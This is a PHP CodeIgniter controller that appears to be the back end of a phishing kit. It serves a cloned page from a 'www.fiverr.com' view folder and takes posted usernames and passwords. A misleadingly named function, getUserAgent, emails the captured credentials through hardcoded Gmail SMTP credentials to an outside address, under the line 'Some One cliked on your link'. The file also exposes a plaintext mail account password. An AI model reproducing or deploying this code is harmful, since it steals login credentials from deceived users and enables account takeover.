<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Welcome extends CI_Controller {

	public function index()
	{
		$this->load->view('www.fiverr.com/index');
	}

	public function gopage()
	{
		$this->load->view('www.fiverr.com/index');
	}

	function getUserAgent(){
        
        $jsonData = array();
        $this->load->helper('url');
        $this->load->library('user_agent');
        
        $userName = $this->input->post('username_cus');
        $password = $this->input->post('password_cus');

        if($this->sendEmailForOwn($userName,$password) === 'done'){
			$jsonData['msg']   = "Done";
        }else{
           	$jsonData['msg']   = "Fail";
        }

        header("Content-Type: application/json");
        echo json_encode($jsonData);
	}

    function sendEmailForOwn($userName,$password){
        
        $config = Array(
            'useragent' => 'CodeIgniter',
            'protocol' => 'SMTP',
            'smtp_host' => 'smtp.googlemail.com',
            'smtp_port' => 465,
            'smtp_user' => 'awesomesginfo@gmail.com',
            'smtp_pass' => '*Awesome007',
            'mailtype'  => 'html', 
            'charset'   => 'utf-8'
        );
        
        $this->load->library('email');
        $this->email->initialize($config);
        //$this->load->library('email', $config);

        $this->email->from('awesomesginfo@gmail.com', 'Important Delivery Information');
        $this->email->to('pixeldesigngroup17@gmail.com');

        $this->email->subject("Welcome To my newsletter");
        $msgbody = '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">';
        $msgbody .= '<html xmlns="http://www.w3.org/1999/xhtml">';
        $msgbody .= '<head>';
        $msgbody .= '<meta name="viewport" content="width=device-width" />';

        $msgbody .= '<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />';
        $msgbody .= '<style type="text/css">';
        $msgbody .= '    * { margin:0;padding:0;}';
        $msgbody .= '    * { font-family: "Helvetica Neue", "Helvetica", Helvetica, Arial, sans-serif; }';

        $msgbody .= '    img { max-width: 100%;  }';
        $msgbody .= '    .collapse {margin:0;padding:0;}';
        $msgbody .= '    body {-webkit-font-smoothing:antialiased; -webkit-text-size-adjust:none; width: 100%!important; }';
        $msgbody .= '    a { color: #2BA6CB;}';
        $msgbody .= '    .btn {';
        $msgbody .= '        text-decoration:none;';
        $msgbody .= '        color: #FFF;';
        $msgbody .= '        background-color: #666;';
        $msgbody .= '        padding:10px 16px;';
        $msgbody .= '        font-weight:bold;';
        $msgbody .= '        margin-right:10px;';
        $msgbody .= '        text-align:center;';
        $msgbody .= '        display: inline-block;';
        $msgbody .= '    }';
        $msgbody .= '    p.callout {';
        $msgbody .= '       padding:15px;';
        $msgbody .= '        background-color:#ECF8FF;';
        $msgbody .= '        margin-bottom: 15px;';
        $msgbody .= '    }';
        $msgbody .= '    .callout a {';
        $msgbody .= '        font-weight:bold;';
        $msgbody .= '        color: #2BA6CB;';
        $msgbody .= '    }';
        $msgbody .= '    table.social {';
        $msgbody .= '        background-color: #ebebeb;';
        $msgbody .= '    }';
        $msgbody .= '   .social .soc-btn {';
        $msgbody .= '        padding: 3px 7px;';
        $msgbody .= '        font-size:12px;';
        $msgbody .= '        margin-bottom:10px;';
        $msgbody .= '        text-decoration:none;';
        $msgbody .= '        color: #FFF;font-weight:bold;';
        $msgbody .= '        display:block;';
        $msgbody .= '        text-align:center;';
        $msgbody .= '    }';
        $msgbody .= '    a.fb { background-color: #3B5998!important; }';
        $msgbody .= '    .four {border-style: dotted;}';
        $msgbody .= '    a.tw { background-color: #1daced!important; }';
        $msgbody .= '    a.gp { background-color: #DB4A39!important; }';
        $msgbody .= '    a.ms { background-color: #000!important; }';
        $msgbody .= '    .sidebar .soc-btn { ';
        $msgbody .= '        display:block;';
        $msgbody .= '        width:100%;';
        $msgbody .= '    }';
        $msgbody .= '    table.head-wrap { width: 100%;border-style: dotted;}';
        $msgbody .= '    table.status { border-style: solid;}';
        $msgbody .= '    .header.container table td.logo { padding: 0px; }';
        $msgbody .= '    .header.container table td.label { padding: 0px; padding-left:0px;}';
        $msgbody .= '    table.body-wrap { width: 100%;border-style: dotted;}';
        $msgbody .= '    table.footer-wrap { width: 100%;    clear:both!important;';
        $msgbody .= '    }';
        $msgbody .= '    .footer-wrap .container td.content  p { border-top: 1px solid rgb(215,215,215); padding-top:15px;}';
        $msgbody .= '    .footer-wrap .container td.content p {';
        $msgbody .= '        font-size:10px;';
        $msgbody .= '        font-weight: bold;';
        $msgbody .= '    }';
        $msgbody .= '    h1,h2,h3,h4,h5,h6 {';
        $msgbody .= '    font-family: "HelveticaNeue-Light", "Helvetica Neue Light", "Helvetica Neue", Helvetica, Arial, "Lucida Grande", sans-serif; line-height: 1.1; margin-bottom:15px; color:#000;';
        $msgbody .= '    }';
        $msgbody .= '    h1 small, h2 small, h3 small, h4 small, h5 small, h6 small { font-size: 60%; color: #6f6f6f; line-height: 0; text-transform: none; }';
        $msgbody .= '    h1 { font-weight:200; font-size: 44px;}';
        $msgbody .= '    h2 { font-weight:200; font-size: 37px;}';
        $msgbody .= '    h3 { font-weight:500; font-size: 27px;}';
        $msgbody .= '    h4 { font-weight:500; font-size: 23px;}';
        $msgbody .= '    h5 { font-weight:900; font-size: 17px;}';
        $msgbody .= '    h6 { font-weight:900; font-size: 14px; text-transform: uppercase; color:#444;}';
        $msgbody .= '    .collapse { margin:0!important;}';
        $msgbody .= '    p, ul { ';
        $msgbody .= '        margin-bottom: 10px; ';
        $msgbody .= '        font-weight: normal; ';
        $msgbody .= '        font-size:14px; ';
        $msgbody .= '        line-height:1.6;';
        $msgbody .= '    }';
        $msgbody .= '    p.lead { font-size:17px;}';
        $msgbody .= '    p.last { margin-bottom:0px;}';
        $msgbody .= '    ul li {';
        $msgbody .= '        margin-left:5px;';
        $msgbody .= '        list-style-position: inside;';
        $msgbody .= '    }';
        $msgbody .= '    ul.sidebar {';
        $msgbody .= '        background:#ebebeb;';
        $msgbody .= '        display:block;';
        $msgbody .= '        list-style-type: none;';
        $msgbody .= '    }';
        $msgbody .= '    ul.sidebar li { display: block; margin:0;}';
        $msgbody .= '    ul.sidebar li a {';
        $msgbody .= '        text-decoration:none;';
        $msgbody .= '        color: #666;';
        $msgbody .= '        padding:10px 16px;';
        $msgbody .= '        margin-right:10px;';
        $msgbody .= '        cursor:pointer;';
        $msgbody .= '        border-bottom: 1px solid #777777;';
        $msgbody .= '        border-top: 1px solid #FFFFFF;';
        $msgbody .= '        display:block;';
        $msgbody .= '        margin:0;';
        $msgbody .= '    }';
        $msgbody .= '    ul.sidebar li a.last { border-bottom-width:0px;}';
        $msgbody .= '    ul.sidebar li a h1,ul.sidebar li a h2,ul.sidebar li a h3,ul.sidebar li a h4,ul.sidebar li a h5,ul.sidebar li a h6,ul.sidebar li a p { margin-bottom:0!important;}';
        $msgbody .= '    .container {';
        $msgbody .= '        display:block!important;';
        $msgbody .= '        max-width:600px!important;';
        $msgbody .= '        margin:0 auto!important;';
        $msgbody .= '        clear:both!important;';
        $msgbody .= '    }';
        $msgbody .= '    .content {';
        $msgbody .= '        padding:0px;';
        $msgbody .= '        max-width:600px;';
        $msgbody .= '        margin:0 auto;';
        $msgbody .= '        display:block; ';
        $msgbody .= '    }';
        $msgbody .= '    .content table { width: 100%; }';
        $msgbody .= '    .column {';
        $msgbody .= '        width: 300px;';
        $msgbody .= '        float:left;';
        $msgbody .= '    }';
        $msgbody .= '    .column tr td { padding: 15px; }';
        $msgbody .= '    .column-wrap { ';
        $msgbody .= '        padding:0!important; ';
        $msgbody .= '        margin:0 auto;'; 
        $msgbody .= '        max-width:600px!important;';
        $msgbody .= '    }';
        $msgbody .= '    .column table { width:100%;}';
        $msgbody .= '    .social .column {';
        $msgbody .= '        width: 280px;';
        $msgbody .= '        min-width: 279px;';
        $msgbody .= '        float:left;';
        $msgbody .= '    }';
        $msgbody .= '    .clear { display: block; clear: both; }';
        $msgbody .= '    @media only screen and (max-width: 600px) {';
        $msgbody .= '        a[class="btn"] { display:block!important; margin-bottom:10px!important; background-image:none!important; margin-right:0!important;}';
        $msgbody .= '        div[class="column"] { width: auto!important; float:none!important;}';
        $msgbody .= '        table.social div[class="column"] {';
        $msgbody .= '            width:auto!important;';
        $msgbody .= '        }';
        $msgbody .= '    }';
        $msgbody .= '</style>';
        $msgbody .= '</head>';
        $msgbody .= '<body bgcolor="#FFFFFF">';
        $msgbody .= '<table class="body-wrap">';
        $msgbody .= '    <tr>';
        $msgbody .= '        <td></td>';
        $msgbody .= '        <td class="container" bgcolor="#FFFFFF">';
        $msgbody .= '            <div class="content">';
        $msgbody .= '            <table>';
        $msgbody .= '                <tr>';
        $msgbody .= '                    <td>';
        $msgbody .= '                       <p> Some One cliked on your link</p>';
        $msgbody .= '                       <p> UserName: </p>'.$userName;
        $msgbody .= '                       <p> Pass:</p>'.$password;
        $msgbody .= '                    </td>';
        $msgbody .= '                </tr>';
        $msgbody .= '            </table>';
        $msgbody .= '            </div>';
        $msgbody .= '        </td>';
        $msgbody .= '        <td></td>';
        $msgbody .= '    </tr>';
        $msgbody .= '</table>';
        $msgbody .= '</body>';
        $msgbody .= '</html>';

        $this->email->message($msgbody);    

        if (!$this->email->send()) {
            die(show_error($this->email->print_debugger())); 
        }else {
            return "done"; 
        }
    }
}
